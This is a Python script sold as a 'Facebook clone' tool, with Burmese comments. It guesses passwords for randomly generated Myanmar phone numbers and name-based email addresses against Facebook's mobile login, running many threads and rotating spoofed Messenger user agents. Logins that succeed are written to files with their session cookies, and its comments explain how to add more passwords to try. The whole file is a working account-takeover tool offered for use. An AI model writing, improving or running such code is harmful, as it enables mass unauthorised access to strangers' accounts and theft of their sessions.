import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ugen = []
ugen = []



#----------User Access Controler----------#👇

import os, getpass, requests, sys

os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
os.system('clear')

approval_description = ("""
\033[0mTo buy this tool,
\033[0mplease connect from Facebook or Telegram.

\033[0mTelegram acc:  https://t.me/wt4p2p
\033[0mTelegram page: https://t.me/wt4p2
""")

print("Loading...")
url = "https://raw.githubusercontent.com/oakarminmg65/Fb-clone-paid-tool/main/ApprovedUsers.txt"
response = requests.get(url)
approved_users = response.text

user_id = str(os.geteuid())
user_name = getpass.getuser()
key = user_id + user_name

if key in approved_users:
    print("\nYour key: " + key)
    print("Your key is approved")
    # time.sleep(2)
else:
    print("\nYour key: " + key)
    print("Your key is not approved")
    print(approval_description)
    sys.exit()

#----------User Access Controler----------#👆




# useragentအပိုင်း👇

"""
# Android Webview Facebook In-App Browser User Agent (Mozilla)
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['8','9', '10', '11', '12', '13', '14', '15'])
    c=' en-us; Symphony Xplorer W32 Build/UNKNOWN) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/'
    d=random.randrange(118, 375,)
    e='0'
    f=random.randrange(3000, 6000)
    g=random.randrange(20, 100)
    #h=';FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/431836095;FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/vivo 1935;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.29375,width=1080,height=2145};]'
    ua=f'{a} {b};{c}{d}.{e}.{f}.{g}'
    ugen.append(ua)
"""

# Android Facebook Messenger User Agent (Dalvik)
for agent in range(1000):        
    a = str(random.randint(4, 13))
    b = random.choice(['V1818A','M1903C3EG','M1810F6LG','SM-N750K','M2003J15SC','SM-S918B','SM-S918B','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-N986B','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','vivo 1951','vivo 1918','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B','GT-S5830L','RMX3491','CPH2269','RMX3191','ASUS_I006D'])
    c = str(random.randint(1, 2))
    d = str(random.randint(1, 9))
    e = str(random.randint(11, 99))
    f = random.choice(["Chrome/","UCBrowser/","Puffin/","UCTurbo/","Opera Mini/"])
    g = str(random.randint(1111, 9999))
    h = str(random.randint(111, 999))
    i = str(random.randint(1, 9))
    changeable_build_info = "Build/PPR1"
    changeable_fb_info = "[FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/245106334;FBCR/Plus;FBMF/"
    user_agent = 'Dalvik/2.1.0 (Linux; U; Android '+a+'.0.0; '+b+' ' + changeable_build_info + '.'+c+''+d+'0'+i+''+e+') ' + changeable_fb_info +b+';FBBD/'+b+';FBDV/'+b+';FBSV/'+b+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(h)+',height='+str(g)+'};]'
    ugen.append(user_agent)
    

    

# useragentအပိုင်း👆

cokbrut=[]
ses=requests.Session()
	
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

# scriptကို စပြီးrunတဲ့အပိုင်း👇
def main():
    os.system('clear') # screen​ပေါ်မှာ​ပေါ်​နေတဲ့စာအားလုံးကို clearလုပ်တယ်။
    print(logo) # logoကို printထုတ်တယ် (or) logoကို screenမှာပြတယ်။
    # 1, 2, 0​ ရွေးခိုင်းတယ်။
    print("\033[1;32m ❮\033[1;97m1\033[1;32m❯ \033[1;97mPHONE NUMBER CLONE          ")
    print("\033[1;32m ❮\033[1;97m2\033[1;32m❯\033[1;97m GMAIL UID CLONE               ")
    print("\033[1;32m ❮\033[1;97m0\033[1;32m❯ \033[1;31mEXIT TOOL                     ")
    linex()
    MYAN = input(f'\033[1;32m ❮\033[1;97m?\033[1;32m❯ \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if MYAN in ["1","01"]:
        phone() # 1ကို​ရွေးရင် phone()ဆိုတဲ့ functionကို​ခေါ်တယ်။
    if MYAN in ["2","02"]:
        gmail_four() # 2ကို​ရွေးရင် gmail_four()ဆိုတဲ့functionကို​ခေါ်တယ်။
    if MYAN in ["0","X"]:        
        os.system('exit') # 0ကို​ရွေးရင် scriptက​နေထွက်တယ်။
# scriptကို စပြီးrunတဲ့အပိုင်း👆

# phone cloneအတွက်function👇
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;32m ❮\033[1;97m✔\033[1;32m❯\033[1;97m EXAMPLE : \033[1;32m❮\033[1;97m789\033[1;32m❯ ❮\033[1;97m440\033[1;32m❯ ❮\033[1;97m670\033[1;32m❯")
    linex()
    code = input('\033[1;32m ❮\033[1;97m?\033[1;32m❯\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m ❮\033[1;97m✔\033[1;32m❯ \033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m3000\033[1;32m❯ ❮\033[1;97m5000\033[1;32m❯ ❮\033[1;97m10000\033[1;32m❯")
    linex()
    limit=int(input("\033[1;32m ❮\033[1;32m?\033[1;32m❯\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m ❮\033[1;97m✔\033[1;32m❯ \033[1;97mTOTAL ID       \x1b[38;5;45m⦿ \033[1;32m'+tl+'                   ')
        print(f'\033[1;32m ❮\033[1;97m✔\033[1;32m❯ \033[1;97mCHOICE CODE    \x1b[38;5;45m⦿ \033[1;32m'+code+'             ')
        print(f" \033[1;32m❮\033[1;97m✔\033[1;32m❯ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
        linex()
        # userထည့်လိုက်တဲ့ codeအ​ပေါ်မူတည်ပြီး random phone numberနဲ့ random passwordလုပ်တဲ့အပိုင်း👇
        for love in user:
            uid = '09'+code+love
            pwx = [love,code+love,code+love[:3]]
            # pwx.extend(["myanmar", "iloveyou", "fuckyou"]) # ကိုယ်ကpasswordအသစ်ထပ်ထည့်ချင်ရင် ဒီlineကို uncommentလုပ်ပြီး ကိုယ်ထည့်ချင်တဲ့ password​တွေထပ်ထည့်လို့ရတယ်။ uncommentလုပ်တယ်ဆိုတာက ​ရှေ့ဆုံးက "#"​လေးကိုဖြုတ်လိုက်တာကို​ပြောတာ။
        # userထည့်လိုက်တဲ့ codeအ​ပေါ်မူတည်ပြီး random phone numberနဲ့ random passwordလုပ်တဲ့အပိုင်း👆
            LEE.submit(rcrack,uid,pwx,tl)
# phone cloneအတွက်function👆

# gmail cloneအတွက်function👇
def gmail_four():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97mtun\033[1;32m❯ ❮\033[1;97mzaw\033[1;32m❯ ❮\033[1;97maung\033[1;32m❯ ")
                linex()
                first = input('\033[1;32m ❮\033[1;97m?\033[1;32m❯\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97mlin\033[1;32m❯ ❮\033[1;97mhtet\033[1;32m║ ❮\033[1;97mmin\033[1;32m❯ ")
                linex()
                last = input('\033[1;32m ❮\033[1;97m?\033[1;32m❯\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m@gmail.com\033[1;32m❯ ❮\033[1;97m@yahoo.com\033[1;32m❯ ")
                linex()
                domain = input('\033[1;32m ❮\033[1;97m?\033[1;32m❯\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m3000\033[1;32m❯ ❮\033[1;97m5000\033[1;32m❯ ❮\033[1;97m10000\033[1;32m❯ ")
                linex()
                try:
                        limit=int(input("\033[1;32m ❮\033[1;97m?\033[1;32m❯\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m ❮\033[1;97m✔\033[1;32m❯ \033[1;97mTOTAL ID       \x1b[38;5;45m⦿ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m ❮\033[1;97m✔\033[1;32m❯ \033[1;97mCRACK NAME     \x1b[38;5;45m⦿ \033[1;32m'+first+'.'+last+'.xxxx'+domain+'')
                        print(f"\033[1;32m ❮\033[1;97m✔\033[1;32m❯ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                
# gmail cloneအတွက်function👆

# crack function👇
# ဒီfunctionက အဓိကအလုပ်လုပ်တဲ့functionပါ။
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \033[1;32m❮%sMYAN-2\033[1;32m❯\033[1;34m\033[1;32m❮\033[38;5;195m%s/%s\033[1;32m❯\033[1;32mOK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies: # ဒီcodeက ရလာတဲ့cookie​ထဲမှာ "c_user"ဆိုတဲ့ဟာ​လေး ပါ၊မပါ စစ်တယ်။ ပါရင်OKအ​ကောင့်လို့ သတ်မှတ်ပြီး လုပ်စရာရှိတာ ဆက်လုပ်တယ်။
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32m  ❮✔❯ {uid} ⦿ {ps}" '\n\033[1;97m❮COOKIE❯ = \033[1;97m'+coki+  '') # OKအ​ကောင့်​တွေကို screen​ပေါ်မှာပြတဲ့codeပါ။
                linex()
                open('/sdcard/MYAN-2-OK.txt', 'a').write( uid+' | '+ps+'\n') # OKအ​ကောင့်​တွေကို fileထဲsaveတဲ့codeပါ။
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies: # ဒီcodeက ရလာတဲ့cookie​ထဲမှာ "checkpoint"ဆိုတဲ့ဟာ​လေး ပါ၊မပါ စစ်တယ်။ ပါရင်CPအ​ကောင့်လို့ သတ်မှတ်ပြီး လုပ်စရာရှိတာ ဆက်လုပ်တယ်။      	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[82:97]
                print(f"\x1b[1;90m  ❮✘❯ {uid} ⦿ {ps}") # CPအ​ကောင့်​တွေကို screen​ပေါ်မှာပြတဲ့codeပါ။ ကိုယ်ကcp​တွေကိုမပြချင်ရင် ဒီlineကို ဖျက်လို့ရပါတယ်။
                # print(f'\033[1;31m❮COOKIE❯ = {coki}')
                open('/sdcard/MYAN-2-CP.txt', 'a').write( uid+' | '+ps+' \n') # CPအ​ကောင့်​တွေကို fileထဲsaveတဲ့codeပါ။
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
# crack function👆

# logo👇
logo= ("""
\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[38;5;88m██╗    ██╗████████╗██╗  ██╗██████╗ ██████╗ 
\033[38;5;89m██║    ██║╚══██╔══╝██║  ██║██╔══██╗╚════██╗
\033[38;5;90m██║ █╗ ██║   ██║   ███████║██████╔╝ █████╔╝
\033[38;5;91m██║███╗██║   ██║   ╚════██║██╔═══╝ ██╔═══╝ 
\033[38;5;92m╚███╔███╔╝   ██║        ██║██║     ███████╗
\033[1;93m ╚══╝╚══╝    ╚═╝        ╚═╝╚═╝     ╚══════╝
\033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
\033[38;5;45m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mOWNER           \033[38;5;41m ━━━━━    \033[1;32m WT4P2          \033[38;5;45m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTELEGRAM        \033[38;5;41m ━━━━━   \033[1;32m @wt4p2p          \033[38;5;43m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mMETHOD          \033[38;5;41m ━━━━━   \033[1;32mSCRAPT METHOD          \033[38;5;43m┃
\033[38;5;44m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL STATUS     \033[38;5;41m ━━━━━    \033[1;32mFREE VERSION          \033[38;5;44m┃
\033[38;5;42m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL VERSION    \033[38;5;41m ━━━━━     \033[1;32m      1.0.0          \033[38;5;42m┃
\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
# logo👆

def linex():
	print(f'\033[1;97m ════════════════════════════════════════════════════')

main()

# ကိုယ်ကcode​တွေရဲ့အလုပ်လုပ်ပုံကို ​သေချာနားလည်ချင်ရ​တော့ python programming language basic​လောက်​တော့ ရမှအဆင်​ပြေမှာပါ။
# ပြီး​တော့ ChatGPTလိုမျိုးaiမှာ ကိုယ်သိချင်တဲ့codeကိုပြပြီး "Please explain this code."လို့​ပြောပြီး ​မေးလို့လည်းရပါတယ်။